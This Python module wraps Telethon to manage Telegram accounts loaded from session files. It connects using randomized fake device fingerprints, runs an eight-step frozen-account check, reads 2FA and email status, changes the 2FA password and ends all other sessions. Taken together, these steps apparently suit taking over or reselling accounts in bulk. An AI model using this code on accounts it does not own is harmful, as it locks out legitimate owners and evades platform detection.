"""
Telegram Security Manager

This module provides a centralized Telegram account security management system.
Handles session connections, 2FA operations, account status checks, and session termination.
"""

import logging
import random
from typing import Dict
import string
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.account import (
    GetPasswordRequest, 
    UpdatePasswordSettingsRequest,
    GetAuthorizationsRequest,
    ResetAuthorizationRequest
)
from telethon.tl.types.account import PasswordInputSettings

logger = logging.getLogger(__name__)


class TelegramSecurityManager:
    """Handles Telegram account security operations"""
    
    def __init__(self, api_id: str, api_hash: str, session_path: str):
        self.api_id = api_id
        self.api_hash = api_hash
        self.session_path = session_path
        self.client = None
        self.password_info = None
        self.user_info = None
        
        # Official Telegram account IDs for verification codes
        self.official_telegram_ids = {
            777000: "Telegram",
            381645: "Code", 
            42777: "Telegram",
            333000: "Telegram",
            4244000: "Telegram",
        }
    
    def generate_device_info(self) -> Dict[str, str]:
        """Generate random device information for session"""
        device_models = [
            "Samsung SM-G973F", "Samsung SM-G975F", "Samsung SM-N970F",
            "iPhone 12 Pro", "iPhone 13", "iPhone 12", "iPhone 11 Pro",
            "Xiaomi MI 11", "Xiaomi Redmi Note 10", "Xiaomi POCO X3",
            "OnePlus 9", "OnePlus 8T", "OnePlus Nord",
            "Huawei P40", "Huawei Mate 40", "Huawei P30 Pro",
            "Google Pixel 5", "Google Pixel 4a", "Google Pixel 6",
            "LG V60", "Sony Xperia 5 II", "Motorola Edge"
        ]
        
        system_versions = [
            "Android 11", "Android 12", "Android 10", "Android 13",
            "iOS 14.6", "iOS 15.1", "iOS 14.8", "iOS 15.4", "iOS 16.0"
        ]
        
        lang_codes = ['en', 'ar', 'es', 'fr', 'de', 'it', 'pt', 'ru', 'zh']
        
        # Generate realistic app version
        major = random.randint(8, 10)
        minor = random.randint(0, 9)
        patch = random.randint(0, 9)
        
        return {
            'device_model': random.choice(device_models),
            'system_version': random.choice(system_versions),
            'app_version': f'{major}.{minor}.{patch}',
            'lang_code': random.choice(lang_codes)
        }
    
    @staticmethod
    def generate_device_info_static() -> Dict[str, str]:
        """Static method to generate random device information"""
        device_models = [
            "Samsung SM-G973F", "Samsung SM-G975F", "Samsung SM-N970F",
            "iPhone 12 Pro", "iPhone 13", "iPhone 12", "iPhone 11 Pro",
            "Xiaomi MI 11", "Xiaomi Redmi Note 10", "Xiaomi POCO X3",
            "OnePlus 9", "OnePlus 8T", "OnePlus Nord",
            "Huawei P40", "Huawei Mate 40", "Huawei P30 Pro",
            "Google Pixel 5", "Google Pixel 4a", "Google Pixel 6",
            "LG V60", "Sony Xperia 5 II", "Motorola Edge"
        ]
        
        system_versions = [
            "Android 11", "Android 12", "Android 10", "Android 13",
            "iOS 14.6", "iOS 15.1", "iOS 14.8", "iOS 15.4", "iOS 16.0"
        ]
        
        lang_codes = ['en', 'ar', 'es', 'fr', 'de', 'it', 'pt', 'ru', 'zh']
        
        # Generate realistic app version
        major = random.randint(8, 10)
        minor = random.randint(0, 9)
        patch = random.randint(0, 9)
        
        return {
            'device_model': random.choice(device_models),
            'system_version': random.choice(system_versions),
            'app_version': f'{major}.{minor}.{patch}',
            'lang_code': random.choice(lang_codes)
        }
    
    async def connect(self) -> bool:
        """Connect to Telegram with the session"""
        import asyncio
        import os
        max_retries = 3
        retry_delay = 2
        
        for attempt in range(max_retries):
            try:
                # Check if the session file exists
                if not os.path.exists(self.session_path):
                    logger.warning(f"Session file not found: {self.session_path}")
                    return False
                
                # Generate unique device info for each session
                device_info = self.generate_device_info()
                
                # Use a unique session path to avoid conflicts
                import uuid
                
                # Remove .session extension and add unique suffix
                base_session_path = self.session_path.replace('.session', '')
                unique_session_path = f"{base_session_path}_{uuid.uuid4().hex[:8]}"
                
                # Copy the original session file to the unique path
                import shutil
                if os.path.exists(self.session_path):
                    shutil.copy2(self.session_path, f"{unique_session_path}.session")
                
                self.client = TelegramClient(
                    unique_session_path,
                    self.api_id,
                    self.api_hash,
                    device_model=device_info['device_model'],
                    system_version=device_info['system_version'],
                    app_version=device_info['app_version'],
                    lang_code=device_info['lang_code'],
                    system_lang_code=device_info['lang_code'],
                    connection_retries=3,
                    retry_delay=1
                )
                
                # Store the unique session path for cleanup
                self.unique_session_path = unique_session_path
                
                # Connect with timeout - use connect() instead of start() to avoid interactive input
                await asyncio.wait_for(self.client.connect(), timeout=30)
                
                # Check if connection is successful
                if not self.client.is_connected():
                    await self.client.disconnect()
                    raise ConnectionError("Client failed to connect")
                
                # Check if client is authorized (has valid session)
                if not await self.client.is_user_authorized():
                    logger.warning("Session is not authorized - cannot proceed without authentication")
                    await self.client.disconnect()
                    return False
                
                # Get user info with timeout
                self.user_info = await asyncio.wait_for(self.client.get_me(), timeout=15)
                
                # Get password info with timeout
                try:
                    self.password_info = await asyncio.wait_for(self.client(GetPasswordRequest()), timeout=15)
                except Exception as e:
                    logger.warning(f"Could not get password info: {e}")
                    self.password_info = None
                
                # Verify connection by checking if user_info is properly set
                if not self.user_info:
                    logger.error("Failed to get user information after connection")
                    await self.client.disconnect()
                    return False
                
                return True
                
            except (errors.AuthRestartError, ConnectionError, asyncio.TimeoutError, OSError) as e:
                logger.warning(f"Connection error on attempt {attempt + 1}: {e}")
                if self.client:
                    await self.client.disconnect()
                    self.client = None
                
                if attempt < max_retries - 1:
                    await asyncio.sleep(retry_delay * (attempt + 1))
                    continue
                else:
                    logger.error(f"Failed to connect after {max_retries} attempts")
                    return False
                    
            except Exception as e:
                logger.error(f"Error connecting to Telegram: {e}")
                if self.client:
                    await self.client.disconnect()
                
                # Clean up on failure
                self.client = None
                self.user_info = None
                self.password_info = None
                return False
    
    async def _comprehensive_frozen_detection(self) -> bool:
        """
        Comprehensive frozen account detection using multiple methods.
        Returns True if account is frozen, False if active.
        """
        import asyncio
        
        # Method 1: Check user status via get_me() - most reliable
        try:
            user_info = await asyncio.wait_for(self.client.get_me(), timeout=10)
            if not user_info:
                logger.warning("Method 1: get_me() returned None - account likely frozen")
                return True
            
            # Check if account is deleted/deactivated
            if hasattr(user_info, 'deleted') and user_info.deleted:
                logger.warning("Method 1: Account marked as deleted")
                return True
                
        except errors.UserDeactivatedError:
            logger.warning("Method 1: UserDeactivatedError - account deactivated")
            return True
        except errors.AuthKeyUnregisteredError:
            logger.warning("Method 1: AuthKeyUnregisteredError - account auth invalid")
            return True
        except errors.UserBannedInChannelError:
            logger.warning("Method 1: UserBannedInChannelError - account banned")
            return True
        except Exception as e:
            logger.warning(f"Method 1: Error getting user info: {e}")
            # Don't immediately assume frozen for network errors
            pass
        
        # Method 2: Try to get account authorization list
        try:
            auth_list = await asyncio.wait_for(self.client(GetAuthorizationsRequest()), timeout=10)
            if not auth_list or not auth_list.authorizations:
                logger.warning("Method 2: No authorizations found - account likely frozen")
                return True
        except errors.UserDeactivatedError:
            logger.warning("Method 2: UserDeactivatedError in authorization check")
            return True
        except errors.AuthKeyUnregisteredError:
            logger.warning("Method 2: AuthKeyUnregisteredError in authorization check")
            return True
        except Exception as e:
            logger.warning(f"Method 2: Error getting authorizations: {e}")
            pass
        
        # Method 3: Try to send message to Saved Messages - CRITICAL FROZEN TEST
        try:
            result = await asyncio.wait_for(self.client.send_message('me', 'Status check'), timeout=10)
            if not result:
                logger.warning("Method 3: Failed to send message to Saved Messages")
                return True
            logger.info("Method 3: Successfully sent message to Saved Messages")
        except errors.UserDeactivatedError:
            logger.warning("Method 3: UserDeactivatedError in message send")
            return True
        except errors.AuthKeyUnregisteredError:
            logger.warning("Method 3: AuthKeyUnregisteredError in message send")
            return True
        except errors.UserBannedInChannelError:
            logger.warning("Method 3: UserBannedInChannelError in message send")
            return True
        except errors.ChatWriteForbiddenError:
            logger.warning("Method 3: ChatWriteForbiddenError - account restricted")
            return True
        except errors.RPCError as e:
            # Check for frozen account specific errors
            if "FROZEN" in str(e) or "PEER_INVALID" in str(e):
                logger.warning(f"Method 3: Frozen account detected in message send: {e}")
                return True
            else:
                logger.warning(f"Method 3: RPCError in message send: {e}")
                pass
        except Exception as e:
            logger.warning(f"Method 3: Error sending message: {e}")
            # For frozen accounts, even basic message sending fails
            if "Peer" in str(e) or "invalid" in str(e).lower():
                logger.warning("Method 3: Message send failed - likely frozen account")
                return True
            pass
        
        # Method 4: Try to get chat info for self
        try:
            chat_info = await asyncio.wait_for(self.client.get_entity('me'), timeout=10)
            if not chat_info:
                logger.warning("Method 4: get_entity('me') returned None")
                return True
        except errors.UserDeactivatedError:
            logger.warning("Method 4: UserDeactivatedError in get_entity")
            return True
        except errors.AuthKeyUnregisteredError:
            logger.warning("Method 4: AuthKeyUnregisteredError in get_entity")
            return True
        except Exception as e:
            logger.warning(f"Method 4: Error getting entity: {e}")
            pass
        
        # Method 5: Try to get dialogs - frozen accounts often can't access dialogs
        try:
            dialogs = await asyncio.wait_for(self.client.get_dialogs(limit=1), timeout=10)
            if dialogs is None:
                logger.warning("Method 5: get_dialogs returned None")
                return True
        except errors.UserDeactivatedError:
            logger.warning("Method 5: UserDeactivatedError in get_dialogs")
            return True
        except errors.AuthKeyUnregisteredError:
            logger.warning("Method 5: AuthKeyUnregisteredError in get_dialogs")
            return True
        except Exception as e:
            logger.warning(f"Method 5: Error getting dialogs: {e}")
            pass
        
        # Method 6: Check if account can perform basic operations
        try:
            # Try to get account privacy settings
            from telethon.tl.functions.account import GetPrivacyRequest
            from telethon.tl.types import InputPrivacyKeyPhoneNumber
            
            privacy_result = await asyncio.wait_for(
                self.client(GetPrivacyRequest(key=InputPrivacyKeyPhoneNumber())), 
                timeout=10
            )
            if not privacy_result:
                logger.warning("Method 6: Privacy settings request failed")
                return True
        except errors.UserDeactivatedError:
            logger.warning("Method 6: UserDeactivatedError in privacy check")
            return True
        except errors.AuthKeyUnregisteredError:
            logger.warning("Method 6: AuthKeyUnregisteredError in privacy check")
            return True
        except errors.RPCError as e:
            # Check for frozen account specific errors
            if "FROZEN_METHOD_INVALID" in str(e):
                logger.warning(f"Method 6: FROZEN_METHOD_INVALID - account is frozen")
                return True
            elif "FROZEN" in str(e):
                logger.warning(f"Method 6: Frozen account detected: {e}")
                return True
            else:
                logger.warning(f"Method 6: RPCError in privacy check: {e}")
                pass
        except Exception as e:
            logger.warning(f"Method 6: Error checking privacy settings: {e}")
            pass
        
        # Method 7: Try to get account settings - comprehensive check
        try:
            from telethon.tl.functions.account import GetAccountTTLRequest
            
            ttl_result = await asyncio.wait_for(
                self.client(GetAccountTTLRequest()), 
                timeout=10
            )
            if not ttl_result:
                logger.warning("Method 7: Account TTL request failed")
                return True
        except errors.UserDeactivatedError:
            logger.warning("Method 7: UserDeactivatedError in TTL check")
            return True
        except errors.AuthKeyUnregisteredError:
            logger.warning("Method 7: AuthKeyUnregisteredError in TTL check")
            return True
        except errors.RPCError as e:
            # Check for frozen account specific errors
            if "FROZEN_METHOD_INVALID" in str(e):
                logger.warning(f"Method 7: FROZEN_METHOD_INVALID - account is frozen")
                return True
            elif "FROZEN" in str(e):
                logger.warning(f"Method 7: Frozen account detected: {e}")
                return True
            else:
                logger.warning(f"Method 7: RPCError in TTL check: {e}")
                pass
        except Exception as e:
            logger.warning(f"Method 7: Error checking account TTL: {e}")
            pass
        
        # Method 8: Final verification - try to get contact information
        try:
            from telethon.tl.functions.contacts import GetContactsRequest
            
            contacts_result = await asyncio.wait_for(
                self.client(GetContactsRequest(hash=0)), 
                timeout=10
            )
            # Even if contacts are empty, the fact that we can make the request means account is active
            logger.info("Method 8: Successfully accessed contacts")
        except errors.UserDeactivatedError:
            logger.warning("Method 8: UserDeactivatedError in contacts check")
            return True
        except errors.AuthKeyUnregisteredError:
            logger.warning("Method 8: AuthKeyUnregisteredError in contacts check")
            return True
        except Exception as e:
            logger.warning(f"Method 8: Error accessing contacts: {e}")
            pass
        
        # All methods passed - account appears to be active
        logger.info("All 8 frozen detection methods passed - account confirmed active")
        return False
    
    async def check_account_status(self) -> Dict:
        """Check if account is frozen and get security settings using comprehensive detection"""
        import asyncio
        try:
            # Check if client and user_info are properly initialized
            if not self.client or not self.user_info:
                logger.error("Client or user_info is not initialized")
                return {'frozen': True, 'has_2fa': False, 'has_email': False, 'phone': None, 'user_id': None}
            
            # Check if client is still connected
            if not self.client.is_connected():
                logger.error("Client is not connected")
                return {'frozen': True, 'has_2fa': False, 'has_email': False, 'phone': None, 'user_id': None}
            
            # Comprehensive frozen account detection using multiple methods
            frozen = await self._comprehensive_frozen_detection()
            
            if frozen:
                logger.warning(f"Account {self.user_info.phone} detected as frozen")
                return {'frozen': True, 'has_2fa': False, 'has_email': False, 'phone': self.user_info.phone, 'user_id': self.user_info.id}
            
            # Check 2FA status
            has_2fa = getattr(self.password_info, 'has_password', False) if self.password_info else False
            
            # Check email settings
            login_email = getattr(self.password_info, 'login_email_pattern', None) if self.password_info else None
            has_email = login_email is not None
            
            # Safely get phone and user_id
            phone = getattr(self.user_info, 'phone', None) if self.user_info else None
            user_id = getattr(self.user_info, 'id', None) if self.user_info else None
            
            return {
                'frozen': frozen,
                'has_2fa': has_2fa,
                'has_email': has_email,
                'phone': phone,
                'user_id': user_id
            }
            
        except Exception as e:
            logger.error(f"Error checking account status: {e}")
            return {'frozen': False, 'has_2fa': False, 'has_email': False, 'phone': None, 'user_id': None}
    
    async def disconnect(self):
        """Properly disconnect and cleanup resources"""
        import os
        try:
            if self.client and self.client.is_connected():
                await self.client.disconnect()
            
            # Clean up temporary session files
            if hasattr(self, 'unique_session_path'):
                for ext in ['.session', '.session-journal']:
                    temp_file = f"{self.unique_session_path}{ext}"
                    if os.path.exists(temp_file):
                        try:
                            os.remove(temp_file)
                        except Exception as e:
                            logger.warning(f"Could not remove temporary session file {temp_file}: {e}")
            
            # Clean up references
            self.client = None
            self.user_info = None
            self.password_info = None
            
        except Exception as e:
            logger.error(f"Error during disconnect: {e}")
            # Force cleanup even if disconnect fails
            self.client = None
            self.user_info = None
            self.password_info = None
    
    async def change_2fa_password(self, current_password: str, new_password: str) -> bool:
        """Change 2FA password"""
        try:
            await self.client.edit_2fa(
                current_password=current_password,
                new_password=new_password
            )
            return True
        except Exception as e:
            logger.error(f"Error changing 2FA password: {e}")
            return False
    
    async def terminate_other_sessions(self) -> bool:
        """Terminate all other sessions except current one"""
        try:
            authorizations = await self.client(GetAuthorizationsRequest())
            
            terminated_count = 0
            for auth in authorizations.authorizations:
                if not getattr(auth, 'current', False):
                    try:
                        await self.client(ResetAuthorizationRequest(hash=auth.hash))
                        terminated_count += 1
                    except:
                        pass
            
            return terminated_count > 0
        except Exception as e:
            logger.error(f"Error terminating sessions: {e}")
            return False
    
